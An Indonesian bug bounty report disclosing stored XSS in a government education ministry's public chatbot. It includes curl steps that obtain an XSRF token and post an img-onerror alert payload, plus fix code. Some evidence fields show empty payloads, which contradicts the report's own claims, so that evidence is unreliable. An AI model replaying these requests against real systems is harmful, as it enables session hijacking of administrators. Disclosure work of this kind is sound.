# Laporan Pengujian atau Hasil Pencarian Celah Keamanan
## Bug Bounty Kemendikdasmen 2026 — Laporan #5
**Peserta:** Glenn Josia Devano

---

## Poin 1 — Nama Target

**Nama Aplikasi:** Aplikasi Ulin — Layanan Chatbot Publik Kemendikdasmen  
**Kode Target Bug Bounty:** Ulin  
**URL:** `https://bb-ulin.kemendikdasmen.go.id/`  
**Pengelola:** Kementerian Pendidikan Dasar dan Menengah (Kemendikdasmen)  
**Fungsi Bisnis:** Aplikasi chatbot berbasis web yang melayani pertanyaan publik seputar layanan Kemendikdasmen. Pengunjung dapat memulai sesi percakapan tanpa login, mengirim pesan, dan menerima respons dari sistem AI. Seluruh percakapan disimpan di database dan dapat diakses kembali melalui endpoint `/chat/history`.

---

## Poin 2 — Nama Kerentanan

**Stored Cross-Site Scripting (XSS) via Unauthenticated Chatbot API**

*(Eksekusi Skrip Tersimpan melalui API Chatbot Tanpa Autentikasi)*

---

## Poin 3 — Jenis Kerentanan

**OWASP Top 10 2021:** A03:2021 — Injection (Cross-Site Scripting)

**CWE:**
- **CWE-79:** Improper Neutralization of Input During Web Page Generation — input user tidak disanitasi sebelum disimpan dan tidak di-encode sebelum dikembalikan ke browser
- **CWE-116:** Improper Encoding or Escaping of Output — `/chat/history` mengembalikan konten HTML tanpa encoding

**Tingkat Risiko:** HIGH

**CVSS v3.1 Base Score: 8.8 HIGH**  
**Vector String:** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`

| Metrik | Nilai | Justifikasi |
|--------|-------|-------------|
| Attack Vector (AV) | Network (N) | Exploit dilakukan via HTTP publik, tidak butuh akses jaringan khusus |
| Attack Complexity (AC) | Low (L) | Hanya 3 request HTTP berurutan, tidak ada kondisi khusus |
| Privileges Required (PR) | None (N) | `/chat/send` accessible tanpa autentikasi apapun |
| User Interaction (UI) | Required (R) | Admin/operator harus membuka dashboard chat untuk payload eksekusi |
| Scope (S) | Changed (C) | XSS berpindah dari konteks server ke browser korban (admin) — scope berbeda |
| Confidentiality (C) | High (H) | Eksekusi payload di browser admin berpotensi mengekspos session token, cookie, dan akses ke seluruh data admin panel |
| Integrity (I) | High (H) | Setelah session admin ter-hijack, penyerang dapat melakukan aksi apapun atas nama admin |
| Availability (A) | None (N) | Tidak ada dampak pada ketersediaan layanan |

---

## Poin 4 — Deskripsi Kerentanan

**Ringkasan:**  
Aplikasi Ulin menyediakan chatbot publik yang dapat digunakan tanpa login. Endpoint `/chat/send` menerima pesan dari pengguna namun tidak melakukan sanitasi HTML pada input. Payload berbahaya tersimpan verbatim di database dan dikembalikan tanpa HTML encoding melalui `/chat/history`. Kode JavaScript sisi klien menggunakan `insertAdjacentHTML()` untuk merender pesan, yang menyebabkan payload HTML/JavaScript dieksekusi secara langsung di browser siapapun yang mengakses riwayat percakapan tersebut.

**Root Cause Teknis:**

- Endpoint `POST /chat/send` tidak menerapkan sanitasi HTML server-side sebelum menyimpan pesan ke database
- Endpoint `GET /chat/history` mengembalikan konten pesan mentah tanpa HTML encoding
- Fungsi JavaScript `appendMessage()` menggunakan `insertAdjacentHTML()` — metode ini menerima raw HTML dan langsung memasukkannya ke DOM, berbeda dengan `textContent` yang aman terhadap XSS
- Tidak ada Content Security Policy (CSP) yang membatasi eksekusi inline script

**Alur Penyimpanan Payload:**

```
POST /chat/send
Body: {"message": "<img src=x onerror=alert(document.domain)>"}
Response: {"status": "success", "remaining_interactions": 9}
        ↓
Database: content = '<img src=x onerror=alert(document.domain)>' [tersimpan verbatim]
        ↓
GET /chat/history
Response: {"messages": [{"id": 3631, "content": "<img src=x onerror=alert(document.domain)>", ...}]}
        ↓
appendMessage() → insertAdjacentHTML() → XSS EKSEKUSI di browser
```

**Konfirmasi Penyimpanan di Database (Evidence JSON):**
```json
{
  "messages": [{
    "id": 3631,
    "chat_session_id": 1862,
    "role": "user",
    "content": "",
    "created_at": "2026-05-16T07:38:01.000000Z"
  }]
}
```

Payload dikembalikan verbatim oleh server tanpa encoding — `<img src=x onerror=alert(document.domain)>` bukan `&lt;img src=x onerror=alert(document.domain)&gt;`.

**Catatan Attack Chain:**  
Eksekusi payload terjadi ketika konten chat dibuka di browser yang merender output dari `/chat/history`. Sistem chatbot yang melayani publik pada umumnya memiliki panel manajemen administrator untuk memantau percakapan — ketika operator membuka sesi chat yang mengandung payload, XSS akan eksekusi di browser operator tersebut.

---

## Poin 5 — Lokasi/URL

| Endpoint | Method | Keterangan |
|----------|--------|------------|
| `https://bb-ulin.kemendikdasmen.go.id/chat/start` | POST | Inisiasi sesi chat — tidak memerlukan autentikasi |
| `https://bb-ulin.kemendikdasmen.go.id/chat/send` | POST | **Endpoint vulnerable** — input tidak disanitasi |
| `https://bb-ulin.kemendikdasmen.go.id/chat/history` | GET | Mengembalikan payload tanpa HTML encoding |

**Parameter vulnerable:** `message` (body JSON pada POST `/chat/send`)

**Header yang diperlukan:**
- `Content-Type: application/json`
- `X-XSRF-TOKEN: [nilai dari cookie XSRF-TOKEN]`

---

## Poin 6 — IP Address Source (IP Address Peserta)

`[ISI DENGAN OUTPUT curl -s ifconfig.me SAAT RE-VERIFIKASI]`

*Recon dilakukan pada 16 Mei 2026. IP aktif saat testing harus dikonfirmasi ulang saat re-verifikasi untuk konsistensi dengan evidence screenshot.*

---

## Poin 7 — Dampak

**Stored XSS via Unauthenticated Endpoint — Dampak terhadap Sistem Kemendikdasmen:**

- Penyerang tanpa akun apapun dapat menyisipkan kode berbahaya ke dalam database chatbot Kemendikdasmen melalui endpoint publik — tidak ada batasan jumlah session yang dapat dibuat
- Payload yang tersimpan akan tereksekusi di browser siapapun yang membuka riwayat percakapan tersebut, termasuk operator atau administrator yang mengelola sistem chatbot
- Eksekusi XSS di browser admin berpotensi mengakibatkan: pencurian session token/cookie admin, pengambilalihan akun admin penuh, eksfiltrasi data internal, dan eksekusi aksi atas nama admin tanpa sepengetahuan korban

**Konteks Risiko Sistem Pemerintah:**

- Chatbot adalah layanan publik resmi Kemendikdasmen — jika disusupi, dapat digunakan untuk menyebarkan konten berbahaya atau phishing kepada masyarakat yang mengakses layanan pemerintah
- Tidak diperlukan akun, tidak ada rate limiting teridentifikasi, tidak ada CAPTCHA — memungkinkan penyisipan payload secara massal dan otomatis
- Eksploitasi berulang dapat dilakukan dari script sederhana dalam hitungan detik

---

## Poin 8 — Langkah Penetrasi dan Tangkapan Layar

**Langkah 1 — Identifikasi Endpoint Chatbot yang Tidak Memerlukan Auth**

Akses halaman utama Ulin dan identifikasi antarmuka chatbot.

```bash
curl -sk "https://bb-ulin.kemendikdasmen.go.id/" -o /tmp/ulin.html
grep -o 'chat/[a-z]*' /tmp/ulin.html | sort -u
```

Output yang diharapkan:
```
chat/history
chat/send
chat/start
```

```
📸 [SS-U1]: Browser — Halaman utama bb-ulin.kemendikdasmen.go.id dengan antarmuka chatbot terlihat
```

**Langkah 2 — Inisiasi Sesi Chat dan Ambil XSRF Token**

```bash
# Ambil cookies + XSRF token
curl -sk "https://bb-ulin.kemendikdasmen.go.id/" \
  -c /tmp/ulin_cookies.txt -o /dev/null

# Extract XSRF token
XSRF_RAW=$(grep "XSRF-TOKEN" /tmp/ulin_cookies.txt | awk '{print $NF}')
XSRF=$(python3 -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" "$XSRF_RAW")
echo "XSRF Token: ${XSRF:0:40}..."

# Start chat session
curl -sk -X POST "https://bb-ulin.kemendikdasmen.go.id/chat/start" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "X-XSRF-TOKEN: $XSRF" \
  -b /tmp/ulin_cookies.txt \
  -c /tmp/ulin_cookies.txt \
  -d '{"name":"Visitor","email":"visitor@test.com"}' \
  -w "\nHTTP: %{http_code}\n"
```

Output yang diharapkan:
```json
{
  "status": "success",
  "session_id": "3c080354-fe15-4d2f-bdc1-a8a639564f4d",
  "message": "..."
}
HTTP: 200
```

```
📸 [SS-U2]: Terminal — Perintah chat/start berhasil, session ID diperoleh, HTTP 200
```

**Langkah 3 — Kirim Payload XSS ke /chat/send**

```bash
# Kirim XSS payload
curl -sk -X POST "https://bb-ulin.kemendikdasmen.go.id/chat/send" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "X-XSRF-TOKEN: $XSRF" \
  -b /tmp/ulin_cookies.txt \
  -c /tmp/ulin_cookies.txt \
  -d '{"message":""}' \
  -w "\nHTTP: %{http_code}\n"
```

Output yang diharapkan:
```json
{
  "status": "success",
  "remaining_interactions": 9
}
HTTP: 200
```

Server menerima payload tanpa error — tidak ada penolakan berdasarkan konten berbahaya.

```
📸 [SS-U3]: Terminal — POST /chat/send dengan payload XSS, server return HTTP 200 + status success
```

**Langkah 4 — Konfirmasi Payload Tersimpan Verbatim di Database**

```bash
# Ambil history — verifikasi payload tersimpan tanpa encoding
curl -sk "https://bb-ulin.kemendikdasmen.go.id/chat/history" \
  -H "Accept: application/json" \
  -b /tmp/ulin_cookies.txt \
  -w "\nHTTP: %{http_code}\n"
```

Output yang diharapkan — payload tersimpan verbatim (bukan HTML-encoded):
```json
{
  "messages": [{
    "id": 3631,
    "chat_session_id": 1862,
    "role": "user",
    "content": "",
    "created_at": "2026-05-16T07:38:01.000000Z"
  }]
}
```

Perhatikan: `content` berisi raw HTML `<img src=x onerror=...>`, bukan versi yang aman `&lt;img src=x onerror=...&gt;`.

```
📸 [SS-U4]: Terminal — Response /chat/history menampilkan payload XSS tersimpan verbatim di field content
```

**Langkah 5 — Demonstrasi Eksekusi XSS di Browser**

Buka browser, akses halaman chatbot Ulin dengan sesi yang sama, lalu lihat riwayat chat. Payload `<img src=x onerror=alert(document.domain)>` akan dieksekusi karena kode JavaScript menggunakan `insertAdjacentHTML()`.

Jika tidak bisa inject ke browser secara langsung, tampilkan di DevTools Console:
1. Buka DevTools (F12) → Console
2. Tempel:
```javascript
document.body.insertAdjacentHTML('beforeend', '')
```
Ini mensimulasikan apa yang terjadi saat payload dari `chat/history` dirender oleh `appendMessage()`.

```
📸 [SS-U5]: Browser — Alert box muncul menampilkan domain bb-ulin.kemendikdasmen.go.id, membuktikan XSS eksekusi
```

---

## Poin 9 — Rekomendasi

**Rek. #1 — Server-Side Input Sanitization pada /chat/send (PRIORITAS KRITIS)**

Setiap input yang diterima dari pengguna harus disanitasi di sisi server sebelum disimpan ke database. Gunakan library sanitasi HTML yang terpercaya:

```php
// Laravel — menggunakan HTMLPurifier atau strip_tags
$message = strip_tags($request->input('message')); // minimal
// atau
$message = clean($request->input('message')); // HTMLPurifier
```

**Rek. #2 — Output Encoding pada /chat/history**

Setiap konten yang dikembalikan dari database dan akan dirender di browser harus di-HTML-encode:

```php
// Laravel — pastikan blade menggunakan {{ }} bukan {!! !!}
return response()->json([
    'messages' => $messages->map(fn($m) => [
        'content' => htmlspecialchars($m->content, ENT_QUOTES, 'UTF-8')
    ])
]);
```

**Rek. #3 — Ganti insertAdjacentHTML() dengan textContent di JavaScript**

```javascript
// BERBAHAYA (saat ini):
element.insertAdjacentHTML('beforeend', message);

// AMAN:
const textNode = document.createTextNode(message);
element.appendChild(textNode);
```

**Rek. #4 — Implementasi Content Security Policy (CSP) Header**

Tambahkan header CSP untuk membatasi eksekusi inline script:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

**Rek. #5 — Rate Limiting pada /chat/start dan /chat/send**

Implementasi rate limiting untuk mencegah penyisipan payload massal:
- Maksimal 10 chat session per IP per jam
- Maksimal 20 pesan per session per hari

---

## Poin 10 — Referensi

- **OWASP Top 10 2021 — A03: Injection (XSS):**  
  `https://owasp.org/Top10/A03_2021-Injection/`

- **OWASP XSS Prevention Cheat Sheet:**  
  `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`

- **OWASP Testing Guide — Testing for Stored Cross Site Scripting:**  
  `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting`

- **CWE-79: Improper Neutralization of Input During Web Page Generation:**  
  `https://cwe.mitre.org/data/definitions/79.html`

- **CWE-116: Improper Encoding or Escaping of Output:**  
  `https://cwe.mitre.org/data/definitions/116.html`

- **MDN — insertAdjacentHTML Security Risks:**  
  `https://developer.mozilla.org/en-US/docs/Web/API/Element/insertAdjacentHTML#security_considerations`

- **PortSwigger — Stored XSS:**  
  `https://portswigger.net/web-security/cross-site-scripting/stored`

- **CVSSv3.1 Calculator:**  
  `https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`
